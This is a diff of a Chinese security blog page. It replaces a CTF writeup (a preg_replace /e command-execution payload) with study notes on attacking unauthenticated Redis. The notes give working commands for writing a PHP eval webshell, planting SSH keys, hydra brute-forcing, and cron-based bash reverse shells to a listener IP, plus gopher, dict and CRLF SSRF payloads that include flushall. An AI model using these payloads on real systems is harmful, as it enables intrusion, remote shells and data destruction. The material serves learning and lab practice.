@@ -3,31 +3,31 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>攻防世界Web - MINX&#39;s Blog</title>
+  <title>Redis未授权访问学习笔记 - MINX&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
-  <meta name="description" content="攻防世界Web进阶部分Writeup">
+  <meta name="description" content="Redis未授权访问学习笔记参考：  https://www.cnblogs.com/-chenxs/p/11749367.html https://blog.csdn.net/guxiaoguo/article/details/78913245 https://xz.aliyun.com/t/4051">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界Web">
-<meta property="og:url" content="http://iminx.cn/2019/10/30/攻防世界WP/index.html">
+<meta property="og:title" content="Redis未授权访问学习笔记">
+<meta property="og:url" content="http://iminx.cn/2019/11/02/Redis未授权访问学习笔记/index.html">
 <meta property="og:site_name" content="MINX&#39;s Blog">
-<meta property="og:description" content="攻防世界Web进阶部分Writeup">
+<meta property="og:description" content="Redis未授权访问学习笔记参考：  https://www.cnblogs.com/-chenxs/p/11749367.html https://blog.csdn.net/guxiaoguo/article/details/78913245 https://xz.aliyun.com/t/4051">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-30T16:11:23.021Z">
+<meta property="og:updated_time" content="2019-11-02T15:55:11.802Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界Web">
-<meta name="twitter:description" content="攻防世界Web进阶部分Writeup">
+<meta name="twitter:title" content="Redis未授权访问学习笔记">
+<meta name="twitter:description" content="Redis未授权访问学习笔记参考：  https://www.cnblogs.com/-chenxs/p/11749367.html https://blog.csdn.net/guxiaoguo/article/details/78913245 https://xz.aliyun.com/t/4051">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1580272697227">
+  <link rel="stylesheet" href="/css/style.css?v=1580272697222">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -139,36 +139,60 @@
         <div class="nexmoe-post">
     <div class="nexmoe-post-cover"> 
         
-        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/2.jpg">
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/11.jpg">
         
-        <h1>攻防世界Web</h1>
+        <h1>Redis未授权访问学习笔记</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月30日</a>
-    <a><i class="nexmoefont icon-areachart"></i>258 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月02日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,061 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
     
-      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Web/">Web</a>
     
     
   </div>
   <article>
-    <p>攻防世界Web进阶部分Writeup</p>
-<a id="more"></a>
-<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>hint：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统<br>所以直接进入设备维护中心，然后再点一下“云平台设备维护中心”，就可以发现有一个page参数，直接php伪协议读index.php，可以读到源码,其中关键部分：</p>
-<pre><code>//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
-if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
-    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
-    $pattern = $_GET[pat];
-    $replacement = $_GET[rep];
-    $subject = $_GET[sub];
-    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
-        preg_replace($pattern, $replacement, $subject);
-    }else{
-        die();
-    }
-}</code></pre><p>这里就比较明显了，就是用三个参数构造后门，这里考的是preg_replace的命令执行漏洞，payload<code>?pat=/test/e&amp;rep=system(&quot;ls&quot;)&amp;sub=jutst%20test</code><br>然后可以构造<code>?pat=/test/e&amp;rep=system(&quot;cd%20s3chahahaDir%26%26cd%20flag%26%26cat%20flag.php&quot;)&amp;sub=jutst%20test</code>读到flag</p>
-<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>一开始以为是sql注入，试了半天不行，看了WP才知道是爆破id，到2333时出flag？？？？</p>
+    <p>Redis未授权访问学习笔记<br>参考：</p>
+<ol>
+<li><a href="https://www.cnblogs.com/-chenxs/p/11749367.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11749367.html</a></li>
+<li><a href="https://blog.csdn.net/guxiaoguo/article/details/78913245" target="_blank" rel="noopener">https://blog.csdn.net/guxiaoguo/article/details/78913245</a></li>
+<li><a href="https://xz.aliyun.com/t/4051" target="_blank" rel="noopener">https://xz.aliyun.com/t/4051</a><a id="more"></a>
+
+</li>
+</ol>
+<h1 id="Redis是什么"><a href="#Redis是什么" class="headerlink" title="Redis是什么"></a>Redis是什么</h1><p>Redis是一款NOSQL数据库，为了保证效率，其数据是缓存在内存中的，但是会周期性的把数据写入磁盘或者把修改操作写入追加的目录文件。同时是key-value型数据库，支持string、list、set（集合）、zset（有序集合）、hash类型的数据</p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>部分服务器将Redis绑定在6379端口并且默认没有开启认证，同时该端口可以在公网直接访问，如果没有进行相关的配置检测，将导致数据直接暴露在公网上，就会造成未授权访问。</p>
+<h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><h3 id="攻击之前先看看一些基本命令"><a href="#攻击之前先看看一些基本命令" class="headerlink" title="攻击之前先看看一些基本命令"></a>攻击之前先看看一些基本命令</h3><ol>
+<li>连接Redis<br><code>redis-cli.exe -h 192.168.107.044</code></li>
+<li>查看键为x的值<code>get x</code></li>
+<li>get所有key<code>ksys *</code></li>
+<li>删除键为key的数据<code>del key</code> </li>
+<li>删除所有键<code>flushall</code></li>
+</ol>
+<h3 id="接下来看看如何利用漏洞"><a href="#接下来看看如何利用漏洞" class="headerlink" title="接下来看看如何利用漏洞"></a>接下来看看如何利用漏洞</h3><ol>
+<li>直接连接redis，可以通过<code>telnet 127.0.0.1 6379</code>连接，也可以<code>redis-cli.exe -h 127.0.0.1</code>(linux下删去.exe即可)，连接成功输入info可以查看配置信息，如果是2.8之后的版本还可以看到配置文件的绝对路径。接下来就可以进行操作了</li>
+<li>如果设置了Redis的密码，可以利用hydra工具爆破<code>hydra -P passwd.txt redis://127.0.0.1</code> hydra使用可见：<a href="https://blog.51cto.com/jzking121/1770605" target="_blank" rel="noopener">https://blog.51cto.com/jzking121/1770605</a></li>
+<li>往网站目录中写入webshell：<pre><code>config set dbfilename webshell.php
+config set dir /var/www/html
+set x &quot;&lt;?php @eval($_POST[&#39;c&#39;]); ?&gt;&quot;
+save</code></pre></li>
+<li>写入ssh公钥<pre><code>set dir /root/.ssh
+dbfilename pub_keys
+set x &quot;公钥&quot;
+save</code></pre></li>
+<li>利用Redis执行命令<br>Redis2.6以前的版本内置了lus环境，可以利用lua执行系统命令：<br>先写一个lua脚本,之后就可以在redis执行命令：<code>redis-cli eval &quot;$(cat hello.lua)&quot; 0 -h 127.0.0.1&quot;</code></li>
+<li>反弹shell<br>原理和写入公钥一样，改一下内容和目录：<pre><code>set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron
+config set dbfilename root
+save</code></pre>此时也可以通过header CRLF 注入方式反弹shell。这里是采用的bash反弹，在ubuntu下不会反弹成功，CentOS可以反弹成功；路径采用的是/etc/crontab。payload:<code>http://xxx.xxx.xx.xx/xx/xx.php?url=http://172.21.0.2:6379/
+test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.220.140%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></li>
+<li>利用CURL命令、gopher协议以及dict协议方式攻击<br>curl+gopher的payload:<pre><code>curl -v &#39;http://xxx.xxx.xx.xx/xx.php?url=
+gopher://172.21.0.2:6379/
+_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；<br>payload采用的是bash反弹，定时程序路径是/var/spool/cron/root<br>发送请求之前在公网机192.168.220.140开启nc监听端口2333<br>dict协议方式攻击:<br>关于dict协议：<br>　　1. dict://serverip:port/命令:参数<br>　　2. 向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</li>
+</ol>
+<p>如果服务端不支持gopher协议，可尝试dict协议，不过通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</p>
+<p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。<br>payload和前面的差不都，详细的可以看:’<a href="https://www.cnblogs.com/-chenxs/p/11749367.html&#39;" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11749367.html&#39;</a></p>
 
   </article>
   
@@ -176,7 +200,7 @@ if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
 <div class="nexmoe-post-copyright">
 <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
 <strong>本文作者：</strong>MINX<br>
-<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/30/攻防世界WP/" title="http://iminx.cn/2019/10/30/攻防世界WP/" target="_blank" rel="noopener">http://iminx.cn/2019/10/30/攻防世界WP/</a><br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/11/02/Redis未授权访问学习笔记/" title="http://iminx.cn/2019/11/02/Redis未授权访问学习笔记/" target="_blank" rel="noopener">http://iminx.cn/2019/11/02/Redis未授权访问学习笔记/</a><br>
 
   <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
 
